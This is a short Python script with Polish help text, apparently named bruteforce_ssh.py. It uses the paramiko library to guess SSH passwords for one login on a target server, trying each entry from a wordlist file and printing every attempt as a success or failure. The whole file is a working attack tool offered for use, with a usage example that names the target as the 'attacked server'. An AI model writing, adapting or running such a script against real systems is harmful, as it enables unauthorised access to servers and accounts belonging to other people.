import paramiko
import sys

if sys.argv[1] == "-h":
    print("")
    print("Jak używać programu?")
    print("")
    print("1 miejsce: adres ip atakowanego serwera")
    print("2 miejsce: login")
    print("3 miejsce: słownik haseł")
    print("")
    print('Przykład: "bruteforce_ssh.py 192.168.21.37 admin slownik.txt"')
    print("")
else:
    host = sys.argv[1]
    login = sys.argv[2]
    sciezka = sys.argv[3]
    dictionary = open(sciezka, "r")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    y = 1

    for x in dictionary:
        try:
            odstep = 15 - len(x)
            ssh.connect(host, username=login, password=x)
            ssh.close()
            print("próba nr: ", y, "| login: ",login, "| hasło: ", x," " * odstep, " udało sie")
            break
        except:
            odstep = 15 - len(x) + 1
            print("próba nr: ", y, "| login: ",login, "| hasło: ", x," " * odstep, "nie udało sie")
            y += 1